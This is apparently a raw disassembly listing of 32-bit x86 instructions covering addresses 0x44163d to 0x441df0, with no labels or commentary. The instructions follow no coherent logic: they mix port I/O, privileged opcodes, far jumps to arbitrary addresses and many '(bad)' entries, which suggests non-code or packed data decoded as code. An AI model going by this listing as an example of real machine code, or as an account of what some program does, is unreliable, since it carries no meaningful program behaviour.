  44163d:	cs jl  0x44167e
  441640:	mov    BYTE PTR [ecx-0x7a],dl
  441643:	je     0x4415e2
  441645:	fdiv   QWORD PTR [ecx+0x1c0216d8]
  44164b:	sbb    DWORD PTR [edi+0x7223d951],ebp
  441651:	lds    esp,FWORD PTR [eax-0x1b]
  441654:	add    DWORD PTR gs:[eax],ecx
  441657:	fld    QWORD PTR [edx+0x52]
  44165a:	cmp    al,0xd7
  44165c:	shr    ebp,cl
  44165e:	lock out 0x91,eax
  441661:	cmp    BYTE PTR [esi+0x1e5a7416],0xb7
  441668:	es dec edi
  44166a:	xchg   edx,eax
  44166b:	add    eax,0xd5d6a1fe
  441670:	call   0x14ddcd05
  441675:	test   al,0x76
  441677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441678:	mov    BYTE PTR [edi+0x3b00b70a],bl
  44167e:	add    edx,DWORD PTR [ebx]
  441680:	std    
  441681:	jo     0x44160d
  441683:	xor    ecx,DWORD PTR [ecx-0x4bcefe97]
  441689:	and    esi,DWORD PTR [edi-0x113077b5]
  44168f:	mov    al,0xc8
  441691:	mov    eax,ds:0x23fb447
  441696:	out    0xa8,al
  441698:	add    edi,DWORD PTR [ebx+0x48]
  44169b:	sahf   
  44169c:	sbb    edi,DWORD PTR [eax+eiz*2+0x1977172f]
  4416a3:	push   ecx
  4416a4:	push   ds
  4416a5:	push   edx
  4416a6:	mov    ebp,ss
  4416a8:	cmp    ah,BYTE PTR [eax]
  4416aa:	adc    BYTE PTR [edx],ch
  4416ac:	cld    
  4416ad:	cmp    ch,BYTE PTR [esi-0xe]
  4416b0:	div    BYTE PTR [edi+0x288e3728]
  4416b6:	pop    esp
  4416b7:	push   ebx
  4416b8:	ror    BYTE PTR [esi],cl
  4416ba:	pusha  
  4416bb:	push   edi
  4416bc:	mov    dl,0xe4
  4416be:	mov    al,0x4b
  4416c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4416c1:	or     al,0x97
  4416c3:	mov    ecx,0x41458d0c
  4416c8:	or     DWORD PTR [edx-0x70a42924],eax
  4416ce:	pop    ds
  4416cf:	jne    0x44171b
  4416d1:	adc    DWORD PTR ds:0x7bc4bd03,0x40
  4416d8:	xor    esp,DWORD PTR [edx+0x6d]
  4416db:	sar    DWORD PTR [ecx],1
  4416dd:	fimul  WORD PTR [edi+0x14]
  4416e0:	leave  
  4416e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4416e2:	jae    0x4416ab
  4416e4:	std    
  4416e5:	cmp    DWORD PTR [esi+0x69],0x3d60c853
  4416ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4416ed:	retf   
  4416ee:	into   
  4416ef:	sbb    al,0xd9
  4416f1:	lock sbb BYTE PTR [ebp-0x30],ah
  4416f5:	add    eax,0x9074ea9c
  4416fa:	nop
  4416fb:	and    al,0xa6
  4416fd:	je     0x44171e
  4416ff:	pop    ss
  441700:	mov    BYTE PTR [edx+0x42],al
  441703:	mov    edx,0xb97e669a
  441708:	test   al,0x26
  44170a:	in     al,0x3f
  44170c:	dec    eax
  44170d:	xchg   edi,eax
  44170e:	jmp    0x4239:0x60e790e9
  441715:	mov    edx,0x40304a77
  44171a:	sbb    ebx,edi
  44171c:	in     al,dx
  44171d:	add    bh,BYTE PTR [esi-0x4883ac8b]
  441723:	test   al,0xf9
  441725:	out    0x6a,eax
  441727:	dec    ebx
  441728:	loop   0x44173f
  44172a:	cwde   
  44172b:	xor    BYTE PTR [ecx],cl
  44172d:	dec    edi
  44172e:	fild   WORD PTR [esi+0x49c64767]
  441734:	mov    DWORD PTR [edx],0xdc29ed49
  44173a:	int    0x40
  44173c:	mov    BYTE PTR [ecx-0x79155082],ch
  441742:	dec    esi
  441743:	and    esi,DWORD PTR [ebx+0x2]
  441746:	cmp    al,0x7f
  441748:	adc    ah,ah
  44174a:	popa   
  44174b:	shr    DWORD PTR [edx+esi*1+0x4b],cl
  44174f:	iret   
  441750:	fstp   TBYTE PTR [edi]
  441752:	pop    ds
  441753:	jmp    DWORD PTR [eax+0x3eae15fc]
  441759:	add    bh,BYTE PTR [esi+0x508974b5]
  44175f:	jnp    0x4417ce
  441761:	mov    bl,0x60
  441763:	stos   DWORD PTR es:[edi],eax
  441764:	outs   dx,BYTE PTR ds:[esi]
  441765:	mov    edi,0x5fa43cb7
  44176a:	jns    0x441740
  44176c:	pop    eax
  44176d:	inc    edx
  44176e:	xchg   ebx,eax
  44176f:	jae    0x44173e
  441771:	or     eax,0xb7b8c58d
  441776:	inc    eax
  441777:	fcomp  QWORD PTR [ecx+eiz*1+0x75]
  44177b:	stos   BYTE PTR es:[edi],al
  44177c:	sbb    BYTE PTR [edx],bl
  44177e:	lods   eax,DWORD PTR ds:[esi]
  44177f:	push   ds
  441780:	jb     0x4417c5
  441782:	xor    eax,0xf7c228ad
  441787:	or     eax,0xd17602a7
  44178c:	cmp    edx,DWORD PTR [eax+ebp*1-0x80]
  441790:	mov    esi,0x9d7aaf6
  441795:	rol    DWORD PTR [ebp+eax*2-0x12],0x16
  44179a:	and    eax,0x5c1eaf24
  44179f:	cmp    edi,edi
  4417a1:	adc    bl,BYTE PTR [edi]
  4417a3:	sahf   
  4417a4:	loop   0x4417e8
  4417a6:	push   eax
  4417a8:	xor    BYTE PTR [ebx],al
  4417aa:	sbb    al,0x97
  4417ac:	push   es
  4417ad:	mov    eax,ds:0x98133aa8
  4417b2:	data16 xlat BYTE PTR ds:[ebx]
  4417b4:	adc    BYTE PTR [ecx+0x37],al
  4417b7:	xchg   esi,eax
  4417b8:	sbb    BYTE PTR [ebx],dl
  4417ba:	sub    esp,DWORD PTR [edx+0x3b]
  4417bd:	add    bh,BYTE PTR [edx+eax*8-0x4be61abf]
  4417c4:	add    esp,DWORD PTR [ebx-0x5e6ec2a4]
  4417ca:	pop    esp
  4417cb:	inc    edi
  4417cc:	mov    DWORD PTR [esi-0x6a],edx
  4417cf:	int    0x46
  4417d1:	pop    ds
  4417d2:	out    0xd8,al
  4417d4:	repz sub DWORD PTR [edx+0x2c],esi
  4417d8:	dec    eax
  4417d9:	(bad)  
  4417db:	xor    al,BYTE PTR [edi+0x7f784662]
  4417e1:	or     BYTE PTR [eax+0x9],ah
  4417e4:	mov    bh,0xe4
  4417e6:	(bad)  [ebp+0x7541bfd6]
  4417ec:	jns    0x441834
  4417ee:	push   esp
  4417ef:	push   ecx
  4417f0:	retf   0x3585
  4417f3:	add    DWORD PTR [ebx-0xc],0x1b
  4417f7:	mov    bl,0x61
  4417f9:	push   ebp
  4417fa:	imul   BYTE PTR [ebx]
  4417fc:	(bad)  
  4417fd:	(bad)  
  4417fe:	ins    DWORD PTR es:[edi],dx
  4417ff:	dec    ecx
  441800:	and    ebx,DWORD PTR [ebp+0x5028e2d9]
  441806:	sahf   
  441807:	aas    
  441808:	sbb    al,BYTE PTR [ebx]
  44180a:	dec    esp
  44180b:	sub    bh,cl
  44180d:	cwde   
  44180e:	(bad)  
  44180f:	int    0x91
  441811:	jg     0x441873
  441813:	mov    DWORD PTR [esi-0x10],eax
  441816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441817:	xchg   BYTE PTR [eax-0x14],dl
  44181a:	sbb    ah,BYTE PTR [ecx-0x2b0eecb8]
  441820:	push   ds
  441821:	icebp  
  441822:	sar    DWORD PTR [eax-0x73413c8f],0x8d
  441829:	xchg   ecx,eax
  44182a:	mov    ds:0x4befc47b,al
  44182f:	fimul  WORD PTR ds:0xe0189f58
  441835:	mov    fs,WORD PTR [eax+0x45]
  441838:	mov    bl,0x45
  44183a:	cmp    edi,DWORD PTR [esi+edi*8-0x4953166b]
  441841:	jbe    0x4417e8
  441843:	add    DWORD PTR [edx-0x67d824fd],ecx
  441849:	lds    ebx,FWORD PTR [esi-0x39f6778a]
  44184f:	mov    WORD PTR [ebp-0x3893c735],gs
  441855:	add    cl,ah
  441857:	pop    edx
  441858:	sub    BYTE PTR [ecx-0x268164cc],ch
  44185e:	cwde   
  44185f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441860:	sub    eax,DWORD PTR [ebx]
  441862:	mov    edi,0xf18cceec
  441867:	rsm    
  441869:	test   DWORD PTR [edi-0x2b],0x242bb897
  441870:	inc    DWORD PTR [eax]
  441872:	mov    ds:0x85ad8887,al
  441877:	add    al,0x9c
  441879:	(bad)
  44187c:	push   eax
  44187d:	add    ecx,DWORD PTR [eax-0x46]
  441880:	mov    al,ds:0xa13693b6
  441885:	mov    cl,0x6d
  441887:	jns    0x4418a1
  441889:	popf   
  44188a:	outs   dx,BYTE PTR ds:[esi]
  44188b:	pop    esi
  44188c:	or     ecx,edi
  44188e:	fsubr  st,st(5)
  441890:	fild   WORD PTR ds:0x373db8a4
  441896:	jno    0x44190e
  441898:	pop    esp
  441899:	push   ss
  44189a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44189b:	stos   DWORD PTR es:[edi],eax
  44189c:	aas    
  44189d:	les    edi,FWORD PTR [esi+0x75]
  4418a0:	lds    eax,FWORD PTR [edx+0x69928190]
  4418a6:	pop    edi
  4418a7:	aad    0xe6
  4418a9:	repnz adc eax,ecx
  4418ac:	or     edx,DWORD PTR [eax+0xd]
  4418af:	cs ins BYTE PTR es:[edi],dx
  4418b1:	shl    al,1
  4418b3:	push   ebx
  4418b4:	mov    ds:0x95412017,al
  4418b9:	xor    DWORD PTR [esi],ebx
  4418bb:	or     edi,DWORD PTR [esi]
  4418bd:	(bad)  
  4418be:	or     bl,BYTE PTR [ebx+eax*2-0x6b178ea2]
  4418c5:	add    eax,0xa2f43d84
  4418ca:	xchg   ebx,eax
  4418cb:	leave  
  4418cc:	mov    edi,edx
  4418ce:	sub    DWORD PTR [esi-0x7fa7fb0d],0xffffffb5
  4418d5:	add    eax,0xa62653c6
  4418da:	pop    es
  4418db:	mov    ds:0xfdf750cd,eax
  4418e0:	mov    al,ds:0x1f519605
  4418e5:	mov    edi,0x5ba1b24
  4418ea:	add    cl,BYTE PTR [edi+eax*2-0x153cc12d]
  4418f1:	xchg   ebx,eax
  4418f2:	ins    DWORD PTR es:[edi],dx
  4418f3:	and    ecx,eax
  4418f5:	push   esp
  4418f6:	jmp    0x940ea18d
  4418fb:	retf   0x5c9
  4418fe:	and    ch,BYTE PTR [eax]
  441900:	ret    0x6591
  441903:	adc    BYTE PTR [eax-0x760a9f36],al
  441909:	out    0x2b,al
  44190b:	je     0x44194b
  44190d:	cmovo  edx,esp
  441910:	and    DWORD PTR [esi-0x2413c061],0xffffffec
  441917:	pop    ebx
  441918:	mov    ebx,edi
  44191a:	mul    DWORD PTR [eax]
  44191c:	js     0x4418fb
  44191e:	fwait
  44191f:	pop    ds
  441920:	mov    BYTE PTR [esi+edx*4],dl
  441923:	sub    bl,al
  441925:	mov    ebx,0x53663422
  44192a:	daa    
  44192b:	jl     0x4418b6
  44192d:	fwait
  44192e:	pop    ebx
  44192f:	(bad)  
  441930:	sbb    ah,BYTE PTR [edi+edi*4]
  441933:	outs   dx,DWORD PTR ds:[esi]
  441934:	inc    edx
  441935:	cmc    
  441936:	aas    
  441937:	xlat   BYTE PTR ds:[ebx]
  441938:	jge    0x441990
  44193a:	mov    ebp,0xa60d57b4
  44193f:	int3   
  441940:	imul   eax,DWORD PTR [eax-0x71],0x53
  441944:	mov    BYTE PTR [edx],0x3a
  441947:	cmp    BYTE PTR [ebp+0x33],0x35
  44194b:	out    dx,al
  44194c:	fild   DWORD PTR [edx]
  44194e:	fs dec edi
  441950:	lods   eax,DWORD PTR ds:[esi]
  441951:	jns    0x44192e
  441953:	scas   al,BYTE PTR es:[edi]
  441954:	add    dh,dl
  441956:	jle    0x44195d
  441958:	or     al,0x35
  44195a:	shr    edx,1
  44195c:	push   ecx
  44195d:	cmp    bh,dl
  44195f:	adc    eax,0xfe581fde
  441964:	sahf   
  441965:	pop    ebp
  441966:	dec    edx
  441967:	and    eax,0x88e8031d
  44196c:	out    dx,eax
  44196d:	sub    esp,ebp
  44196f:	call   0xcca7:0xab870989
  441976:	std    
  441977:	push   ss
  441978:	and    al,0x5b
  44197a:	push   edx
  44197b:	xor    cl,bh
  44197d:	adc    al,0xc0
  44197f:	sub    BYTE PTR [edi+0x2f560a7],dh
  441985:	sar    dl,0x5f
  441988:	mov    edi,ebx
  44198a:	jnp    0x441995
  44198c:	aaa    
  44198d:	ret    0xbf14
  441990:	cmp    ah,dh
  441992:	and    eax,0x8bfe7dd7
  441997:	mov    dl,0x2e
  441999:	jae    0x441a01
  44199b:	repnz mov DWORD PTR [ecx],ebx
  44199e:	fdivr  st,st(0)
  4419a0:	and    BYTE PTR [edi],cl
  4419a2:	jl     0x441941
  4419a4:	add    BYTE PTR [ecx],bl
  4419a6:	es mov ch,0x74
  4419a9:	ds scas al,BYTE PTR es:[edi]
  4419ab:	push   ebp
  4419ac:	cdq    
  4419ad:	fistp  WORD PTR [ebp+0x513b885f]
  4419b3:	jno    0x4419d4
  4419b5:	xlat   BYTE PTR ds:[ebx]
  4419b6:	mov    ebx,0x2c1f8490
  4419bb:	push   ecx
  4419bc:	(bad)  
  4419bd:	in     al,dx
  4419be:	dec    ecx
  4419bf:	xchg   ecx,eax
  4419c0:	pop    edx
  4419c1:	cmp    eax,0x47fae70d
  4419c6:	pop    ds
  4419c7:	iret   
  4419c8:	adc    al,0xac
  4419ca:	mov    cl,ah
  4419cc:	cmp    BYTE PTR [ebp-0x37bc2b68],ah
  4419d2:	scas   al,BYTE PTR es:[edi]
  4419d3:	or     eax,0x8e5918be
  4419d8:	mov    BYTE PTR ds:0x54d818bf,cl
  4419de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4419df:	fidiv  DWORD PTR [esi]
  4419e1:	add    eax,eax
  4419e3:	mov    bl,0xa0
  4419e5:	inc    esp
  4419e6:	icebp  
  4419e7:	push   eax
  4419e8:	stc    
  4419e9:	lea    ecx,[edi]
  4419eb:	dec    ecx
  4419ec:	mov    ecx,esp
  4419ee:	stos   BYTE PTR es:[edi],al
  4419ef:	(bad)  
  4419f0:	scas   eax,DWORD PTR es:[edi]
  4419f1:	enter  0x7292,0x60
  4419f5:	add    esp,DWORD PTR [edx-0x73]
  4419f8:	add    bh,BYTE PTR [edi]
  4419fa:	retf   
  4419fb:	les    ebp,FWORD PTR [ebx*1-0x72830e2]
  441a02:	pop    es
  441a03:	clc    
  441a04:	mov    eax,0x32d57be2
  441a09:	xchg   ebx,eax
  441a0a:	cld    
  441a0b:	retf   
  441a0c:	(bad)  [eax+0x258965b3]
  441a12:	mov    ?,WORD PTR [eax+edx*1]
  441a15:	mov    DWORD PTR [ebx],ebp
  441a17:	lea    ebp,fs:[ecx]
  441a1a:	push   cs
  441a1b:	(bad)  
  441a1c:	lds    eax,FWORD PTR [edi+ebx*8+0x34]
  441a20:	sub    DWORD PTR [eax+ebx*1-0x34c67177],0xf619bc2c
  441a2b:	cmc    
  441a2c:	ret    0x4bdd
  441a2f:	rcr    ebp,1
  441a31:	or     ah,BYTE PTR [ecx+0x21ce8969]
  441a37:	int    0x3a
  441a39:	or     dl,BYTE PTR [edx+0x32]
  441a3c:	mov    BYTE PTR [ebx-0x4d9504c6],bh
  441a42:	push   ecx
  441a43:	pop    es
  441a44:	ja     0x441a49
  441a46:	aam    0x52
  441a48:	enter  0x1524,0x47
  441a4c:	xchg   ecx,eax
  441a4d:	xor    dl,BYTE PTR [eax-0x6be738bf]
  441a53:	mov    DWORD PTR [edx-0x5be4e0af],edx
  441a59:	push   edi
  441a5a:	push   eax
  441a5b:	xchg   edx,eax
  441a5c:	adc    al,0x3
  441a5e:	test   BYTE PTR [eax-0x4a],0x2b
  441a62:	add    DWORD PTR [ebp-0x72b5a762],edi
  441a68:	call   0x871b8f21
  441a6d:	mov    cl,0x60
  441a6f:	cmp    DWORD PTR [esi-0xcb6bedf],esp
  441a75:	or     ch,BYTE PTR [esp+esi*2+0x4647f4a5]
  441a7c:	leave  
  441a7d:	and    ebx,DWORD PTR [edi]
  441a7f:	or     DWORD PTR [ebp+0x2ba20774],eax
  441a85:	rol    DWORD PTR [eax+0x73ce4e6c],cl
  441a8b:	cwde   
  441a8c:	and    al,BYTE PTR [edx-0x3d3b627b]
  441a92:	jno    0x441ac8
  441a94:	icebp  
  441a95:	pop    ebp
  441a96:	or     al,0xd7
  441a98:	inc    esp
  441a99:	stos   DWORD PTR es:[edi],eax
  441a9a:	sar    esp,cl
  441a9c:	jl     0x441a56
  441a9e:	fst    st(5)
  441aa0:	xlat   BYTE PTR ds:[ebx]
  441aa1:	add    bl,0xf1
  441aa4:	retf   
  441aa5:	test   dl,cl
  441aa7:	mov    dl,0x88
  441aa9:	jno    0x441a40
  441aab:	repnz and esp,ebx
  441aae:	(bad)  
  441aaf:	xchg   DWORD PTR [edi+0x22],edi
  441ab2:	or     eax,0x3fd75524
  441ab7:	pop    esp
  441ab8:	or     DWORD PTR [edx+0x4b],edi
  441abb:	mov    edi,0x27840262
  441ac0:	adc    al,0xb3
  441ac2:	ins    BYTE PTR es:[edi],dx
  441ac3:	cmp    al,0x88
  441ac5:	daa    
  441ac6:	mov    dh,0x35
  441ac8:	push   ebp
  441ac9:	sahf   
  441aca:	dec    ecx
  441acb:	mov    eax,0xb38414f9
  441ad0:	outs   dx,BYTE PTR ds:[esi]
  441ad1:	aas    
  441ad2:	sbb    dh,BYTE PTR [esp+edi*4-0x7382e163]
  441ad9:	mov    ebp,0xcab6a7af
  441ade:	scas   eax,DWORD PTR es:[edi]
  441adf:	push   esp
  441ae0:	cmc    
  441ae1:	stos   BYTE PTR es:[edi],al
  441ae2:	and    cl,bl
  441ae4:	xchg   edx,eax
  441ae5:	add    eax,0x23815ba4
  441aea:	arpl   WORD PTR [ebx+ebp*1+0x7e216d61],sp
  441af1:	lods   al,BYTE PTR ds:[esi]
  441af2:	inc    esi
  441af3:	and    eax,0xe565501d
  441af8:	cmp    esi,ecx
  441afa:	mov    al,BYTE PTR [ebp-0x2b6d8498]
  441b00:	pop    ebp
  441b01:	inc    ebp
  441b02:	dec    ebx
  441b03:	sbb    eax,0xd9c4933f
  441b08:	(bad)  
  441b09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441b0a:	bound  esp,QWORD PTR [ebp+0x55]
  441b0d:	mov    esp,0xf61aa579
  441b12:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  441b14:	scas   al,BYTE PTR es:[edi]
  441b15:	daa    
  441b16:	or     bh,0x60
  441b19:	clc    
  441b1a:	pop    ds
  441b1b:	fwait
  441b1c:	cli    
  441b1d:	push   ecx
  441b1e:	cwde   
  441b1f:	xor    ecx,DWORD PTR [edx+ebp*1]
  441b22:	inc    edx
  441b23:	xor    edx,ecx
  441b25:	daa    
  441b26:	lahf   
  441b27:	push   cs
  441b28:	test   BYTE PTR ds:0x7e91d275,0xb3
  441b2f:	add    BYTE PTR [esi-0x19f781fb],dh
  441b35:	xor    edx,esi
  441b37:	sub    al,0x19
  441b39:	inc    edx
  441b3a:	push   ds
  441b3b:	dec    ebp
  441b3c:	(bad)  
  441b3d:	jg     0x441add
  441b3f:	mov    ebp,0x9ff7b75c
  441b44:	ss cli 
  441b46:	test   eax,0x81f3e6d5
  441b4b:	cmp    dl,BYTE PTR [ecx+0x5f]
  441b4e:	pop    ebp
  441b4f:	sub    edx,ebp
  441b51:	add    eax,0x3335ff5
  441b56:	js     0x441b49
  441b58:	cdq    
  441b59:	frstor [edi-0x34]
  441b5c:	mov    esi,0x18f35205
  441b61:	cs jl  0x441b87
  441b64:	push   ecx
  441b65:	push   edx
  441b66:	push   esi
  441b67:	pop    ebp
  441b68:	dec    esp
  441b69:	sbb    bl,0x79
  441b6c:	or     ecx,esp
  441b6e:	scas   al,BYTE PTR es:[edi]
  441b6f:	cmp    DWORD PTR [esi+ecx*1-0x73],ebx
  441b73:	shr    DWORD PTR [eax+eiz*4+0x7a],cl
  441b77:	mov    dl,0x6c
  441b79:	sbb    ebx,edi
  441b7b:	or     BYTE PTR [edi+0x1b],ch
  441b7e:	pop    esp
  441b7f:	gs ds adc al,0x1e
  441b83:	xor    bl,BYTE PTR [eax]
  441b85:	icebp  
  441b86:	jmp    0xf9c9:0x6202d3b7
  441b8d:	adc    DWORD PTR ds:0x1f648e96,edx
  441b93:	test   eax,0xf4c3097
  441b98:	pusha  
  441b99:	outs   dx,BYTE PTR ds:[esi]
  441b9a:	add    dh,BYTE PTR [ebp-0x76542906]
  441ba0:	enter  0x2595,0x32
  441ba4:	push   ds
  441ba5:	hlt    
  441ba6:	outs   dx,BYTE PTR ds:[esi]
  441ba7:	dec    edi
  441ba8:	and    eax,0x2dc31ea2
  441bad:	neg    DWORD PTR [ecx+edx*2]
  441bb0:	cmc    
  441bb1:	sar    eax,1
  441bb3:	(bad)  
  441bb4:	loope  0x441bdf
  441bb6:	xor    BYTE PTR [ecx-0x7ba05100],ah
  441bbc:	or     edi,edi
  441bbe:	ja     0x441bf4
  441bc0:	mov    DWORD PTR [ebp-0x357cb9f0],ecx
  441bc6:	stos   BYTE PTR es:[edi],al
  441bc7:	inc    esp
  441bc8:	into   
  441bc9:	add    eax,0xd0471816
  441bce:	cdq    
  441bcf:	pop    esp
  441bd0:	retf   
  441bd1:	and    ebx,DWORD PTR [edi]
  441bd3:	pop    ss
  441bd4:	out    0x3e,al
  441bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441bd7:	inc    eax
  441bd8:	in     al,dx
  441bd9:	sbb    esi,DWORD PTR [ecx+edx*8-0x4326e7db]
  441be0:	lds    edx,FWORD PTR [ecx]
  441be2:	and    DWORD PTR [ebx-0x12],edx
  441be5:	inc    ebx
  441be6:	dec    edx
  441be7:	int3   
  441be8:	test   BYTE PTR [eax+0x58],bh
  441beb:	dec    edi
  441bec:	retf   0x1f81
  441bef:	mov    ebp,0xec209381
  441bf4:	test   BYTE PTR ds:0x342ca086,al
  441bfa:	sub    BYTE PTR [edx+0x47608a7d],0xfd
  441c01:	xchg   BYTE PTR [ecx],al
  441c03:	add    BYTE PTR [edx+0x245f7fc],0x3
  441c0a:	sbb    BYTE PTR [edx+0x2a3be8a7],al
  441c10:	pop    edx
  441c11:	outs   dx,DWORD PTR ds:[esi]
  441c12:	push   edi
  441c13:	daa    
  441c14:	cdq    
  441c15:	xchg   edx,eax
  441c16:	pusha  
  441c17:	jecxz  0x441bf9
  441c19:	cmp    al,0xac
  441c1b:	mov    al,0x40
  441c1d:	sbb    bh,BYTE PTR [eax+0x6]
  441c20:	(bad)  
  441c23:	aam    0x60
  441c25:	mov    ah,0x6d
  441c27:	psubb  mm4,QWORD PTR [ebx]
  441c2a:	pop    ds
  441c2b:	mov    edx,0x549f6244
  441c30:	and    eax,ebx
  441c32:	arpl   WORD PTR [ebp+0x6fe400cf],cx
  441c38:	and    eax,0xa8d81e05
  441c3d:	inc    ebp
  441c3e:	mov    ds:0xb8b389aa,al
  441c43:	cmp    BYTE PTR [eax-0x6b49df56],dl
  441c49:	adc    al,0x74
  441c4b:	jmp    0x36c499c0
  441c50:	mov    al,0x16
  441c52:	adc    DWORD PTR ds:0x3a9d3f58,edx
  441c58:	xchg   esp,eax
  441c59:	gs loopne 0x441c06
  441c5c:	into   
  441c5d:	aam    0xd9
  441c5f:	dec    eax
  441c60:	jmp    0xcc5e3b45
  441c65:	add    cl,BYTE PTR [esi+0x6fb4900e]
  441c6b:	cwde   
  441c6c:	cdq    
  441c6d:	sbb    eax,0xf9a3b1e
  441c72:	dec    esp
  441c73:	scas   eax,DWORD PTR es:[edi]
  441c74:	pop    esi
  441c75:	pop    edx
  441c76:	test   esp,edx
  441c78:	call   0x49bd5a53
  441c7d:	imul   edi,DWORD PTR [eax],0xffffffca
  441c80:	adc    DWORD PTR [ebx+0x346ab153],0x1f
  441c87:	dec    edx
  441c88:	in     al,dx
  441c89:	mov    es,esi
  441c8b:	aad    0xe2
  441c8d:	jmp    0xafbb:0xe1d63b70
  441c94:	mov    DWORD PTR [ebx-0x6010b6fb],esi
  441c9a:	inc    esi
  441c9b:	and    eax,0x5d7a02f2
  441ca0:	fnstenv [edi-0x53]
  441ca3:	dec    eax
  441ca4:	push   ebx
  441ca5:	xor    bl,BYTE PTR [esi]
  441ca7:	inc    ebx
  441ca8:	jge    0x441c71
  441caa:	ret    
  441cab:	add    DWORD PTR [esi-0xd2b47bf],ebx
  441cb1:	ficomp DWORD PTR [edx+0x51]
  441cb4:	sbb    cl,BYTE PTR [ebp-0x46]
  441cb7:	test   BYTE PTR [eax-0x6ebb992b],cl
  441cbd:	gs dec ebx
  441cbf:	leave  
  441cc0:	outs   dx,DWORD PTR ds:[esi]
  441cc1:	add    dl,BYTE PTR [edx+0x3b]
  441cc4:	or     ch,dl
  441cc6:	or     cl,ch
  441cc8:	and    esp,ebx
  441cca:	pusha  
  441ccb:	mov    ebx,0x2f203274
  441cd0:	sub    bh,cl
  441cd2:	imul   ebx,DWORD PTR [ebp-0x2b1fd953],0x4
  441cd9:	leave  
  441cda:	ret    0xacfd
  441cdd:	inc    edi
  441cde:	mov    ebx,0x1f9fa6e9
  441ce3:	(bad)  
  441ce4:	leave  
  441ce5:	not    bl
  441ce7:	in     eax,0xcd
  441ce9:	add    dh,BYTE PTR [esi+0x2300ad51]
  441cef:	push   edx
  441cf0:	test   dl,ah
  441cf2:	add    ah,BYTE PTR [edi]
  441cf4:	inc    ebp
  441cf5:	cld    
  441cf6:	pusha  
  441cf7:	retf   
  441cf8:	xor    DWORD PTR [ecx],ecx
  441cfa:	cmp    DWORD PTR [edi+0x76],edx
  441cfd:	push   eax
  441cfe:	pop    ebp
  441cff:	aad    0xeb
  441d01:	push   ebp
  441d02:	fisub  DWORD PTR [edx]
  441d04:	jne    0x441d12
  441d06:	dec    BYTE PTR [edx]
  441d08:	mov    DWORD PTR [ecx+0x75],ebp
  441d0b:	mov    dl,0x7d
  441d0d:	into   
  441d0e:	pop    ebx
  441d0f:	loop   0x441d6c
  441d11:	test   ebx,eax
  441d13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441d14:	mov    ebp,DWORD PTR [esi+0x501040c0]
  441d1a:	pop    es
  441d1b:	sub    cl,BYTE PTR cs:[ebx]
  441d1e:	pushf  
  441d1f:	lahf   
  441d20:	dec    eax
  441d21:	outs   dx,DWORD PTR ds:[esi]
  441d22:	pop    ds
  441d23:	and    DWORD PTR [edx],0xffffffba
  441d26:	cli    
  441d27:	cmp    eax,DWORD PTR [edx+0x3a]
  441d2a:	or     edi,edi
  441d2c:	adc    al,0x2
  441d2e:	call   0x269b1a09
  441d33:	fld    DWORD PTR [ebx-0x5f]
  441d36:	pusha  
  441d37:	ret    
  441d38:	aam    0x30
  441d3a:	xor    bl,BYTE PTR [eax]
  441d3c:	dec    esi
  441d3d:	xchg   ecx,esi
  441d3f:	aad    0x24
  441d41:	ret    0xaee
  441d44:	cmp    BYTE PTR [eax+0x7f893929],cl
  441d4a:	fdiv   DWORD PTR ds:0x60f7a4b8
  441d50:	pop    ebx
  441d51:	sbb    eax,0x5a1e91e6
  441d56:	jle    0x441d42
  441d58:	mov    al,dh
  441d5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441d5b:	cmc    
  441d5c:	dec    esp
  441d5d:	dec    eax
  441d5e:	push   ds
  441d5f:	addr16 xor al,0x1a
  441d62:	rcl    DWORD PTR [ebx],cl
  441d64:	mov    cl,BYTE PTR [edx-0x16]
  441d67:	aad    0xfc
  441d69:	mov    cs,WORD PTR [ebx]
  441d6b:	dec    esi
  441d6c:	adc    eax,0x16b05a90
  441d71:	fs mov bh,0x40
  441d74:	mov    DWORD PTR [ebp+0x655468b6],eax
  441d7a:	sahf   
  441d7b:	test   DWORD PTR [eax+0x7d478911],ecx
  441d81:	nop
  441d82:	pushf  
  441d83:	in     eax,dx
  441d84:	sub    eax,0x26bcba02
  441d89:	in     eax,0x8e
  441d8b:	add    DWORD PTR [edx],ecx
  441d8d:	mov    bh,0x17
  441d8f:	mov    ah,0x88
  441d91:	stc    
  441d92:	outs   dx,BYTE PTR ds:[esi]
  441d93:	idiv   DWORD PTR [esi+0x2f]
  441d96:	jge    0x441d32
  441d98:	ins    BYTE PTR es:[edi],dx
  441d99:	or     dh,BYTE PTR [edx+0x7ce6e0d5]
  441d9f:	xor    eax,0xe5a580d7
  441da4:	xchg   esi,eax
  441da5:	mov    DWORD PTR [eax+0x68],ebp
  441da8:	fadd   QWORD PTR [eax+eiz*2]
  441dab:	fisub  DWORD PTR [ecx]
  441dad:	cmp    ax,WORD PTR [ecx]
  441db0:	je     0x441db5
  441db2:	mov    ah,0x70
  441db4:	loope  0x441e2d
  441db6:	fmul   QWORD PTR [esi]
  441db8:	(bad)  
  441db9:	adc    al,0x1f
  441dbb:	add    DWORD PTR [edx],0xffffff84
  441dbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441dbf:	loop   0x441d95
  441dc1:	jbe    0x441e31
  441dc3:	stos   DWORD PTR es:[edi],eax
  441dc4:	leave  
  441dc5:	cld    
  441dc6:	jle    0x441e3e
  441dc8:	addr16 and eax,edi
  441dcb:	popf   
  441dcc:	or     eax,0x4f611f29
  441dd1:	jb     0x441dbc
  441dd3:	push   0xd60520d0
  441dd8:	jae    0x441db1
  441dda:	in     eax,0x4e
  441ddc:	or     al,0x30
  441dde:	push   edx
  441ddf:	cld    
  441de0:	js     0x441de2
  441de2:	push   ds
  441de3:	xor    eax,0xd059e78d
  441de8:	and    BYTE PTR [edi],0x75
  441deb:	cdq    
  441dec:	ss dec edx
  441dee:	add    al,0x25
  441df0:	clc    
